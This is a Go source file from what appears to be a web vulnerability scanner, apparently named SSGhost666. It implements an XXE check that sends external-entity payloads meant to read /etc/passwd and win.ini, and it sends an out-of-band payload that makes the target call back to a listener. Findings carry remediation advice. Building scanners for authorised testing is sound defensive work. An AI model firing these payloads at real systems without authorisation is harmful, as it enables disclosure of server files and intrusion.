package scanner

import (
	"context"
	"fmt"
	"regexp"
	"strings"
	"time"

	"ssghost666/internal/httpclient"
	"ssghost666/internal/model"
	"ssghost666/internal/ratelimiter"
)

// --- XXE (XML External Entity) ---------------------------------------------
//
// Only endpoints that actually accept XML can be vulnerable, so this check
// is gated on the target looking XML-ish (URL ends in .xml/.wsdl/soap, or a
// captured response / its Content-Type said XML, or it has a structured
// body parameter). Once XML handling is plausible, an external-entity
// DOCTYPE is submitted and, if the response contains a local file's
// contents — or a callback reaches the OOB listener — the injection is
// confirmed.

// xxeParamEntity builds an XML document with an external entity named
// after the target's own first parameter, so the document at least
// shares a tag with the endpoint being tested.
func xxeParamEntity(entity, uri string) string {
	return `<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE ` + entity + ` [<!ENTITY xxe SYSTEM "` + uri + `">]>` +
		`<` + entity + `><value>&xxe;</value></` + entity + `>`
}

var xxeFileMarkers = []string{"root:x:0:0", "root:.*:0:0", "[fonts]", "[extensions]", "daemon:x:"}

var xxeFilePaths = []string{"/etc/passwd", "/etc/hostname", "C:\\Windows\\win.ini"}

func matchXXEFile(body string) string {
	for _, m := range xxeFileMarkers {
		if strings.Contains(body, m) {
			return m
		}
	}
	for _, re := range []*regexp.Regexp{
		regexp.MustCompile(`(?m)^root:[^:]*:0:0:`),
		regexp.MustCompile(`(?i)for 16-bit app support`),
	} {
		if m := re.FindString(body); m != "" {
			return m
		}
	}
	return ""
}

// looksLikeXMLTarget is a cheap gate: only endpoints whose URL or captured
// content type suggests XML get an XXE probe, to avoid pointless noise.
func looksLikeXMLTarget(t model.Target) bool {
	low := strings.ToLower(t.URL)
	if strings.Contains(low, ".xml") || strings.Contains(low, "soap") || strings.Contains(low, "wsdl") {
		return true
	}
	if strings.Contains(strings.ToLower(t.ContentType), "xml") {
		return true
	}
	for _, p := range t.Params {
		if p.Location == model.LocBody {
			return true // a structured body param is what XXE payloads target
		}
	}
	return false
}

// CheckXXE tests one target for XML external entity injection.
func CheckXXE(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, t model.Target, oob *OOBCallback) []model.Finding {
	if !looksLikeXMLTarget(t) {
		return nil
	}

	contentType := "application/xml"
	if ct := t.ContentType; strings.Contains(strings.ToLower(ct), "xml") {
		contentType = t.ContentType
	}

	// Determine the tag name to use: the target's first body param if it
	// has one, otherwise a generic wrapper.
	entity := "root"
	for _, p := range t.Params {
		if p.Location == model.LocBody {
			entity = p.Name
			break
		}
	}

	// --- Tier 1: non-destructive file-read confirmation ----------------
	for _, path := range xxeFilePaths {
		payload := xxeParamEntity(entity, path)
		ex := sendRawBody(ctx, lim, cli, t, "POST", contentType, payload)
		if ex.Err != nil || ex.Response == nil {
			continue
		}
		if sig := matchXXEFile(ex.Body); sig != "" {
			return []model.Finding{{
				Category:    "XXE",
				Severity:    model.SeverityCritical,
				Title:       "XML External Entity (XXE) file disclosure",
				Description: fmt.Sprintf("An external-entity DOCTYPE referencing %q caused the response to contain the local file's contents (matched %q), confirming that the XML parser resolves external entities and discloses local files.", path, sig),
				URL:         t.URL,
				Method:      "POST",
				Parameter:   "XML body",
				Evidence:    model.Evidence{RequestRaw: ex.RequestRaw, ResponseRaw: ex.ResponseRaw, Notes: "Matched file marker: " + sig},
				Remediation: "Disable external entity resolution in the XML parser (e.g. set XMLConstants.FEATURE_SECURE_PROCESSING, disable DTDs, or use a hardened parser) and avoid passing untrusted XML to a permissive parser.",
			}}
		}
	}

	// --- Tier 2: out-of-band confirmation ------------------------------
	if oob == nil {
		return nil
	}
	marker := "xxe-" + Marker()
	token := Marker()
	cbURL := "http://" + oob.Addr() + "/" + marker + "/" + token
	payload := `<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE ` + entity + ` [<!ENTITY xxe SYSTEM "` + cbURL + `">]>` +
		`<` + entity + `>&xxe;</` + entity + `>`

	ex := sendRawBody(ctx, lim, cli, t, "POST", contentType, payload)
	if ex.Err != nil || ex.Response == nil {
		return nil
	}
	time.Sleep(700 * time.Millisecond)
	if hit := oob.CheckHit(marker); hit != nil {
		return []model.Finding{{
			Category:    "XXE",
			Severity:    model.SeverityCritical,
			Title:       "Blind XXE confirmed via out-of-band callback",
			Description: fmt.Sprintf("An external-entity DOCTYPE pointing at our callback URL caused the target server to connect back to SSGhost666 (from %s). If the callback came from the server rather than the user agent, this confirms blind XXE even when no file content is reflected.", hit.RemoteIP),
			URL:         t.URL,
			Method:      "POST",
			Parameter:   "XML body",
			Evidence:    model.Evidence{RequestRaw: ex.RequestRaw, ResponseRaw: ex.ResponseRaw, Notes: fmt.Sprintf("OOB callback from %s at %s\nUser-Agent: %s", hit.RemoteIP, hit.Timestamp.Format(time.RFC3339), hit.UserAgent)},
			Remediation: "Disable external entity and DTD processing in the XML parser, and restrict the parser from making outbound network requests.",
		}}
	}
	return nil
}
